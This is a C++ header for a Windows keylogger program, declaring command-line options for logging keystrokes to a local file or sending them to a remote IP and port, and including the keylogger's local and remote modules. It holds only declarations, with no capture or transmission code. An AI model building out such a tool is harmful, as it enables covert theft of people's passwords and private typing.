#ifndef _MAIN_HPP_
#define _MAIN_HPP_

#include <winsock2.h>
#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <string>
#include <cstring>
#include <cstddef>
#include <sstream>

#define DEFAULT_IP_VALUE "127.0.0.1"
#define DEFAULT_PORT_VALUE 6666

#define DEFAULT_FILE_PATH "D:/temp.txt"

#define LONG_OPTION_LOCAL "local"
#define LONG_OPTION_FILE_PATH "file_path"
#define LONG_OPTION_REMOTE "remote"
#define LONG_OPTION_IP "ip"
#define LONG_OPTION_PORT "port"
#define LONG_OPTION_NO_ARROW "no_arrow"
#define LONG_OPTION_NO_CLICK "no_click"
#define LONG_OPTION_ASCII_ONLY "ascii_only"
#define LONG_OPTION_MAXIMUM_BUFFER_SIZE "maximum_buffer_size"
#define LONG_OPTION_HELP "help"

#define SHORT_OPTION_LOCAL 'l'
#define SHORT_OPTION_FILE_PATH 'f'
#define SHORT_OPTION_REMOTE 'r'
#define SHORT_OPTION_IP 'i'
#define SHORT_OPTION_PORT 'p'
#define SHORT_OPTION_NO_ARROW 'a'
#define SHORT_OPTION_NO_CLICK 'c'
#define SHORT_OPTION_ASCII_ONLY 'A'
#define SHORT_OPTION_MAXIMUM_BUFFER_SIZE 'm'
#define SHORT_OPTION_HELP 'h'

#define ERROR_MESSAGE_SETCONTROLECTRLHANDLER "error SetConsoleCtrlHandler "

#define NO_ERROR 0

#include "./keylogger/keylogger.cpp"
#include "./keylogger/keylogger_local/keylogger_local.cpp"
#include "./keylogger/keylogger_remote/keylogger_remote.cpp"

extern bool g_keylogger_local;
extern bool g_keylogger__remote;

extern string* g_file_path;

extern string* g_ip;
extern int g_port;

extern keylogger* g_keylogger;

void print_help();

void initialize_options(int, char**);

int main(int, char**);

#endif
